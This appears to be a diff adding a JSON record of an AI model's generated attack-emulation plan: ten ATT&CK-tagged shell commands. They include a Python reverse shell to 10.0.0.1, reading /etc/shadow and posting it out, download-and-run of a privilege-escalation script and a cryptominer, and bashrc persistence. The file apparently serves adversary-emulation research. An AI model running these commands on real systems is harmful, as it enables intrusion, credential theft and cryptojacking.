@@ -1,0 +1,112 @@
+{
+  "campaign_id": "C0045",
+  "model": "gpt-oss:20b",
+  "sample": 2,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "curl-download",
+      "command": "curl -L -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz",
+        "destination": "/tmp/xmrig.tar.gz"
+      }
+    },
+    {
+      "technique_id": "T1190",
+      "mechanism": "http-exploit",
+      "command": "curl -X POST http://ray.example.com/v1/exploit -d '{\"cmd\":\"exploit\"}'",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "host": "ray.example.com",
+        "path": "/v1/exploit",
+        "data": "{\"cmd\":\"exploit\"}"
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "mechanism": "python-reverse-shell",
+      "command": "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "target": "target.primary",
+      "parameters": {
+        "attacker_ip": "10.0.0.1",
+        "port": 4444
+      }
+    },
+    {
+      "technique_id": "T1546.004",
+      "mechanism": "append-bashrc",
+      "command": "echo 'export PATH=$PATH:/opt/miner' >> ~/.bashrc",
+      "target": "target.primary",
+      "parameters": {
+        "file": "~/.bashrc",
+        "content": "export PATH=$PATH:/opt/miner"
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "mechanism": "download-and-exec-escalate",
+      "command": "curl -L -o /tmp/escalate.sh https://example.com/escalate.sh && chmod +x /tmp/escalate.sh && /tmp/escalate.sh",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/escalate.sh",
+        "destination": "/tmp/escalate.sh"
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "mechanism": "base64-decode-and-exec",
+      "command": "echo 'cHJpbnQoIkhlbGxvLCBXb3JsZCEiKQ==' | base64 --decode > /tmp/decoded.py && python3 /tmp/decoded.py",
+      "target": "target.primary",
+      "parameters": {
+        "base64": "cHJpbnQoIkhlbGxvLCBXb3JsZCEiKQ==",
+        "output": "/tmp/decoded.py"
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "mechanism": "cat-hashes-and-send",
+      "command": "cat /etc/shadow > /tmp/hashes.txt && curl -X POST --data-binary @/tmp/hashes.txt http://10.0.0.1/upload_hashes",
+      "target": "target.primary",
+      "parameters": {
+        "remote_host": "10.0.0.1",
+        "remote_path": "/upload_hashes"
+      }
+    },
+    {
+      "technique_id": "T1016",
+      "mechanism": "dig-ip",
+      "command": "dig +short myip.opendns.com @resolver1.opendns.com > /tmp/my_ip.txt",
+      "target": "target.primary",
+      "parameters": {
+        "output": "/tmp/my_ip.txt"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-miner",
+      "command": "curl -L -o /tmp/xmrig https://example.com/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig",
+        "destination": "/tmp/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "mechanism": "start-gpu-miner",
+      "command": "/tmp/xmrig --gpu 1 >/dev/null 2>&1 &",
+      "target": "target.primary",
+      "parameters": {
+        "binary": "/tmp/xmrig",
+        "options": "--gpu 1"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "2f7e079f8b4ae1435a7dd10354f0dffcc8791047143042392fa7d54d0cbe9778"
+}
